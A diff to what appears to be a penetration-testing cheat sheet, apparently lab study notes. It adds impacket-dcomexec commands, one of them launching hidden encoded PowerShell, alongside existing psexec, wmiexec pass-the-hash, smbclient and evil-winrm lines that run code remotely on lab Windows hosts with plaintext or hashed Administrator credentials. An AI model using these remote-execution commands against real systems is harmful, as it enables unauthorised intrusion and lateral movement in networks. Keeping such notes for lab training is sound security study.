@@ -355,6 +355,9 @@ smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
 impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 # wmiexec
 impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+# dcomexec
+impacket-dcomexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
 # evil-winrm
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
 ```
